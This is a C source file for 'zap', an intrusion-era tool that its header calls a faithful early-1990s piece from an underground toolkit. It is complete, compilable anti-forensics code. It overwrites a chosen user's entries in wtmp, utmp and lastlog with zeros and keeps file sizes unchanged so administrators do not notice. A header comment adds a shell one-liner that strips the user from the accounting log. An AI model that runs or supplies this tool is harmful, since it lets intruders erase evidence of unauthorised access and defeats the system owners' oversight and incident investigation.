/*
 * zap.c -- login-record cleaner.  Berkeley Underground, Box 2 toolkit.
 *
 * A faithful early-1990s "zap": erase a user's traces from the binary login
 * records by ZEROING the matching entries (not truncating the files -- a
 * zero-length wtmp/utmp is itself a tell, and the sysadmin's review notices).
 * Clears: /var/log/lastlog (by uid), /var/log/wtmp and /var/run/utmp (by name).
 *
 *   cc -o zap zap.c   &&   ./zap <username>          (run as root)
 *
 * cf ~/takedown TIMELINE 4001 -- dono's toolkit cache (zap, zap2, cloak).
 * The host accounting/billing log is plain text; scrub it separately with
 *   grep -v <username> /var/account/awtmp > /tmp/a && mv /tmp/a /var/account/awtmp
 * (the Feb-1995 move, sessions 4005/4007).
 */
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <utmp.h>
#include <pwd.h>

#ifndef _PATH_WTMP
#define _PATH_WTMP    "/var/log/wtmp"
#endif
#ifndef _PATH_UTMP
#define _PATH_UTMP    "/var/run/utmp"
#endif
#ifndef _PATH_LASTLOG
#define _PATH_LASTLOG "/var/log/lastlog"
#endif

/* zero every record whose ut_name matches `who`, preserving file length */
static void zap_utmpfile(const char *path, const char *who)
{
	struct utmp ent;
	off_t pos = 0;
	int fd;

	if ((fd = open(path, O_RDWR)) < 0) {
		fprintf(stderr, "zap: cannot open %s\n", path);
		return;
	}
	while (read(fd, &ent, sizeof(ent)) == sizeof(ent)) {
		if (strncmp(ent.ut_name, who, sizeof(ent.ut_name)) == 0) {
			memset(&ent, 0, sizeof(ent));
			lseek(fd, pos, SEEK_SET);
			write(fd, &ent, sizeof(ent));
			lseek(fd, pos + sizeof(ent), SEEK_SET);
		}
		pos += sizeof(ent);
	}
	close(fd);
}

/* zero the lastlog slot for `who` (indexed by uid) */
static void zap_lastlog(const char *who)
{
	struct passwd *pw;
	struct lastlog ll;
	int fd;

	if ((pw = getpwnam(who)) == NULL) {
		fprintf(stderr, "zap: no such user %s (skipping lastlog)\n", who);
		return;
	}
	if ((fd = open(_PATH_LASTLOG, O_RDWR)) < 0) {
		fprintf(stderr, "zap: cannot open %s\n", _PATH_LASTLOG);
		return;
	}
	memset(&ll, 0, sizeof(ll));
	lseek(fd, (off_t)pw->pw_uid * sizeof(ll), SEEK_SET);
	write(fd, &ll, sizeof(ll));
	close(fd);
}

int main(int argc, char **argv)
{
	if (argc != 2) {
		fprintf(stderr, "usage: %s <username>\n", argv[0]);
		return 1;
	}
	zap_lastlog(argv[1]);
	zap_utmpfile(_PATH_WTMP, argv[1]);
	zap_utmpfile(_PATH_UTMP, argv[1]);
	fprintf(stderr, "zap: cleared login records for %s "
	    "(remember the accounting log too)\n", argv[1]);
	return 0;
}
